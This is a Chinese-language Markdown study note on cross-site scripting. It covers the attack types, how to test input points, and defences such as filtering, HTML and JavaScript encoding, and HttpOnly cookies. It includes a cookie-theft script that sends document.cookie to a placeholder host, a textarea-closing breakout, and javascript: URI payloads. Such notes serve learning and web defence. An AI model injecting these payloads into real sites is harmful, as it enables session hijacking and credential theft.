# XSS

<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->
<!-- code_chunk_output -->

- [XSS](#xss)
    - [概述](#概述)
      - [1.XSS（cross-site scripting）](#1xsscross-site-scripting)
      - [2.XSS类型](#2xss类型)
        - [（1）stored XSS attacks（最常见）](#1stored-xss-attacks最常见)
        - [（2）reflected XSS attacks](#2reflected-xss-attacks)
        - [（3）DOM XSS attacks（少见）](#3dom-xss-attacks少见)
      - [3.实现XSS攻击条件](#3实现xss攻击条件)
      - [4.如何利用XSS攻击](#4如何利用xss攻击)
    - [攻击](#攻击)
      - [1.寻找可攻击的输入点](#1寻找可攻击的输入点)
        - [（1）找到一个输入点](#1找到一个输入点)
        - [（2）测试输入点](#2测试输入点)
      - [2.简单的攻击测试](#2简单的攻击测试)
        - [（1）基本测试](#1基本测试)
        - [（2）闭合标签](#2闭合标签)
        - [（3）多标签测试](#3多标签测试)
    - [防护](#防护)
      - [1.XSS Filter](#1xss-filter)
      - [2.实体化编码](#2实体化编码)
        - [（1）html编码](#1html编码)
        - [（2）javascript编码](#2javascript编码)
      - [3.HttpOnly](#3httponly)

<!-- /code_chunk_output -->

### 概述

#### 1.XSS（cross-site scripting）
跨站脚本攻击，通过提交数据的方式，向网页中注入javascript脚本，然后脚本会在客户端执行
重点是在html中插入javascript脚本，并让用户执行

#### 2.XSS类型

##### （1）stored XSS attacks（最常见）
用户的输入会被存储在目标服务器上，比如：留言、评论等
当有其他用户浏览这些数据时，就会执行注入的脚本

##### （2）reflected XSS attacks
直接返回用户的输入，不会存储，比如：错误信息
所以攻击者需要构建一个url（该url会注入javascript脚本），诱骗用户点击该url，从而使得脚本能够在用户端执行

##### （3）DOM XSS attacks（少见）
注入的脚本不会传输到服务端，这是与前两种的本质区别

#### 3.实现XSS攻击条件
* 有可控的输入点
* 输入信息可以在用户的浏览器中显示
* 能够输入可执行的javascript脚本
  * 需要输入时，未对数据进行过滤、编码等
* 用户访问时，浏览器能够将这些输入信息解析为javascript脚本，并且执行

#### 4.如何利用XSS攻击
* 窃取cookie
```html
<script>
Document.location='http://www.xxx.com/cookie.php?cookie='+document.cookie;
</script>
```

* 网络钓鱼
利用正规网站的XSS漏洞，构建一个url，然后该url中插入脚本
当用户点击该url中，会打开该正规网站，并弹出一个小窗口（该小窗口就是插入的脚本），
让用户输入账号密码，从而窃取到用户的账号密码
</br>
* 窃取客户端信息
可以注入监听脚本，对于用户是无感知的，但是可以记录用户按键的信息，然后发送给攻击者

***

### 攻击

#### 1.寻找可攻击的输入点

##### （1）找到一个输入点

##### （2）测试输入点
输入正常的信息，输入后，查看源码，查看输入的信息显示在哪里了
然后查看该信息所处的上下文（即是不是在某个标签内等等）
从而决定如何实施XSS攻击

#### 2.简单的攻击测试
根据上下文嵌入测试脚本

##### （1）基本测试
当所处上下文可以插入脚本
```html
<script>alert("test")</script>
```

##### （2）闭合标签
当所处上下文只允许输入文本信息
* 上下文
```html
<textarea>用户输入</textarea>
```

* 用户输入
```html
</textarea><script>alert("test")</script>
<!-- 首先需要闭合textarea标签，否则直接输入脚本标签，会被当做文本处理，不会被执行 -->
```

* 防护：黑名单过滤
过滤特定的关键词，比如过滤掉`<script>`这个关键词

##### （3）多标签测试
能触发脚本执行的标签不只有`<script>`，还有其他很多
```html
<a href="javascript:alert("test")">
<IMG SRC="javascript:alert("test")">
```

***
### 防护

#### 1.XSS Filter
匹配危险字符（比如：`<script>`），替换成安全字符，比如空格

* 浏览器的XSS Filter只能防止 反射型XSS，无法防止其他类型的XSS（比如存储型，浏览器无法区分哪些是恶意的脚本）
  * 发送请求时，过滤请求中的数据
  * 现在浏览器都弃用XSS Filter
* 服务端的XSS Filter可以防止 反射型XSS和存储型
  * 返回响应时，过滤渲染模板时用的数据

#### 2.实体化编码
对用户的输入进行编码，在服务端进行，严格限定了数据就是数据，避免数据被当成代码执行

##### （1）html编码
当浏览器渲染html时，看到编码后的内容，会显示成相应的字符
|编码前|编码后|显示|
|-|-|-|
|&|`&amp;`|&amp;|
|<|`&lt;`|&lt;|
|>|`&gt;`|&gt;|
|"|`&quot;`|&quot;|
|'|`&#x27;` 或者 `&apos;`|&#x27; 或者 &apos;|
|/|`&#x2F;`|&#x2F;|

##### （2）javascript编码
当用户输入的信息需要被嵌入到javascript代码块中，利用javascript编码，防止用户的输入的内容被执行
|编码前|编码后|显示|
|-|-|-|
|'|`\'`|\'|
|"|`\"`|\"|

#### 3.HttpOnly
给cookie设置一个属性，那么浏览器就会禁止javascript读取这个cookie，从而避免了cookie被窃取
* 没有广泛应用，因为从业务便利性的角度考虑，比如网站做广告推荐时，会利用js脚本读取用户cookie以作精确推广
